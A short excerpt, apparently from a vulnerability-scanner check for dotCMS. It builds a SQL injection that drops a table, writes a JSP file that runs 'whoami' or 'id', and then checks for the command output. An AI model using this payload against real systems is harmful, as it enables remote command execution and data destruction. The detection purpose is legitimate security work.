...
file = "vt_dotcms_test";
js_code = "CHAR(60)||'% String cmd; String[] cmdarr; String OS = System.getProperty(" + "\"os.name\"" + ");" + " if (OS.startsWith(" + "\"Windows\"" + ")) { cmd = new String (" + "\"whoami > " + file + ".txt\");" + " cmdarr = new String [] {" + "\"cmd\", \"/C\"," + " cmd'||CHAR(125)||';'||CHAR(125)||' else {" + " cmd = new String (" + "\"id > " + file + ".txt\");" + " cmdarr = new String [] {\"/bin/sh\", \"-c\"" + ", cmd'||CHAR(125)||';'||CHAR(125)||' Process p = Runtime.getRuntime().exec(cmdarr);%'||CHAR(62)";
sql_inj = "' AND 1=0);DROP TABLE IF EXISTS category_reorder; CREATE TABLE IF NOT EXISTS d(ID INT PRIMARY" + " KEY,X VARCHAR(999));INSERT INTO d VALUES(1," + js_code + ");SCRIPT TO '" + file + ".jsp' TABLE d;" + "DROP TABLE d;--";
...
if(http_vuln_check( port: port, url: dir + "/" + file + ".txt", pattern: "uid=[0-9]+.*gid=[0-9]+.*", check_header: TRUE )){
